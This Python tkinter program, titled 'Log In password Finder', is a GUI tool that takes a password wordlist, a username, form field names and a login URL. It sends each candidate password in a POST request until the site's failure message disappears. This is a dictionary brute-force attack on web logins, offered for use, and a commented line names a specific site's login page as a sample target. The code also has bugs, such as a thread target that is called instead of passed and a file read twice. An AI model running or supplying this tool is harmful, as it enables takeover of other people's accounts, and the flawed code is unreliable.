from tkinter import *
import requests
from tkinter import filedialog
import threading
import yaml  # convert string to dictionary
import re

root = Tk()
root.title("Log In password Finder")
root.geometry('700x600')
root.config(bg="white")

### main code

def pass_login_finder():
    if entry_browse_txt_file.get() == "":
        notification_error_equation.set("error: insert path of password.txt file")
    elif data_txt_file.get()=="":
        notification_error_equation.set("error: insert path of data.txt file")
    elif entry_url_login_field.get()== "":
        notification_error_equation.set("error: insert URL ")
    elif entry_username_field.get() == "":
        notification_error_equation.set("error: insert username field ")
    elif entry_password_field.get() == "":
        notification_error_equation.set("error: insert password field")
    elif entry_login_username_field.get() == "":
        notification_error_equation.set("error:insert login username")
    elif entry_check_message_field.get() == "":
        notification_error_equation.set("error: insert error  of wrong login username or password")
    else :
        global data_txt_path
        global password_txt_path
        url = entry_url_login_field.get()
        count = 1
        with open(data_txt_path, "r") as file:
            for line in file.readlines():
                if re.compile("{('\w*':'\w*',?)*}").search(line) == None:
                    notification_error_equation.set("error: insert data in data.txt like dictionary")
            else:
                data_param = yaml.load(''.join(file.readlines()))

        with open(password_txt_path, "r") as file_password:
            for line in file_password.readlines():
                payload = {entry_username_field.get(): entry_login_username_field.get(),
                           entry_password_field.get(): line[:-1]}
                payload.update(data_param)
                res_post = requests.post(url, data=payload)
                if entry_check_message_field.get() in res_post.text:
                    text_box_output.insert(END, f"{count}-->{line}: not match password\n")
                    root.update()
                    count += 1

                else:
                    notification_success_equation.set(
                        f"the login password is found successfully:\n try {count}--> match password is -->{line}")
                    break


def main_function():
    t=threading.Thread(target = pass_login_finder())
    t.start()


### frame 1 --> browse button , frame 2 ---> entry field   frame 3 --> start button

frame1 = Frame(root , bg="white")
frame2 = Frame(root , bg ="white")
frame3 = Frame(root , bg ="white")
frame4 = Frame(root,bg = "white")
frame1.grid(row=0)
frame2.grid(row=1)
frame3.grid(row=2)
frame4.grid(row=4,pady=10)

### all functions need---

### load password file
def file_load_password_txt():
    global password_txt_path
    password_txt_path = filedialog.askopenfilename(parent=frame1,title="select file",filetypes = (("file","password.txt",".csv"),("all files","*.*")))
    entry_browse_button_equation.set(password_txt_path)

### load data file    --
def file_load_data_txt():
    global data_txt_path
    data_txt_path = filedialog.askopenfilename(parent=frame1, title="select file",
                                                    filetypes=(("file", "data.txt", ".csv"), ("all files", "*.*")))
    entry_data_button_equation.set(data_txt_path)


### first frame 1

### button and entry for browse password file and data file

entry_browse_button_equation = StringVar()
button_browse_txt_file = Button(frame1,text = "password file",width=10,height=1,font = ('4'),bg = "dark salmon",command=lambda: file_load_password_txt())
button_browse_txt_file.grid(row=1,column=0)
entry_browse_txt_file = Entry(frame1,font=('10'),width=50,textvariable=entry_browse_button_equation)
entry_browse_txt_file.grid(row=1,column=1)
#entry_browse_button_equation.set("browse path of password.txt :")

entry_data_button_equation = StringVar()
button_data_txt_file = Button(frame1,text = "data file",font = ('4'),width=10,height=1,bg = "dark salmon",command=lambda: file_load_data_txt())
button_data_txt_file.grid(row=2,column=0)
data_txt_file = Entry(frame1,font=('10'),width=50,textvariable=entry_data_button_equation)
data_txt_file.grid(row=2,column=1)
#entry_data_button_equation.set("browse path of data.txt :")
## end of frame 1

## start of frame 2
## url field
url_equation = StringVar()
label_url_login_field = Label(frame2,text = "URL :",font=('10'),bg="white")
label_url_login_field.grid(row=0,column=0,pady = 5)
entry_url_login_field = Entry(frame2,font=('10'),width =50,textvariable = url_equation)
entry_url_login_field.grid(row=0,column=1,pady=5)
#url_equation.set("http://siyanew.com/test_pro/index.php")

### username field---> string

label_username_field = Label(frame2,text = "username field :",font=('10'),bg="white")
label_username_field.grid(row=1,column=0,pady=5)
entry_username_field = Entry(frame2,font=('10'),width =30)
entry_username_field.grid(row=1,column=1,pady=5)

### password field--> string
frame2.config(pady =30)
label_password_field = Label(frame2,text = "password field :",font=('10'),bg="white")
label_password_field.grid(row=2,column=0,pady=5)
entry_password_field = Entry(frame2,font=('10'),width =30)
entry_password_field.grid(row=2,column=1,pady=5)


### username ----> username for site login

label_login_username_field = Label(frame2,text = "login username :",font=('10'),bg="white")
label_login_username_field.grid(row=3,column=0,pady=5)
entry_login_username_field = Entry(frame2,font=('10'),width =30)
entry_login_username_field.grid(row=3,column=1,pady=5)

### check message
error_message_equation = StringVar()
label_check_message_field = Label(frame2,text = "check error message :",font=('10'),bg="white")
label_check_message_field.grid(row=4,column=0,pady=5)
entry_check_message_field = Entry(frame2,font=('10'),width =50,textvariable=error_message_equation)
entry_check_message_field.grid(row=4,column=1,pady=5)
#error_message_equation.set("Invalid username")

### button for start
button_request_login = Button(frame2,text = "start", width=10, height =1,bg="dark salmon",font=('10'),command=lambda: main_function())
button_request_login.grid(row=5,column=0,pady=10)
button_request_login = Button(frame2,text = "stop", width=10, height =1,bg="dark salmon",font=('10'),command= lambda:quit())
button_request_login.grid(row=5,column=1,pady=10)


### end of frame 2

### start frame 3
### notifications --> error  successfully massage  match password  not match password
notification_error_equation = StringVar()
label_notification_error = Label(frame3,bg="white", fg="red",font=('12'),textvariable = notification_error_equation)
label_notification_error.grid(row=1)
notification_success_equation = StringVar()
label_notification_success = Label(frame3,bg="white", fg="green",textvariable = notification_success_equation,font=('12'))
label_notification_success.grid(row=2)
### end of frame 3

### first of fram 4 : define textbox for messages


text_box_output = Text(frame4,width = 50, height = 8, font = ('8'))
text_box_output.pack(side =LEFT,fill = BOTH)
scroll_text_box = Scrollbar (frame4)
scroll_text_box.pack(side = RIGHT,fill= BOTH)
scroll_text_box.config(command=text_box_output.yview())
text_box_output.config(yscrollcommand = scroll_text_box.set)

root.mainloop()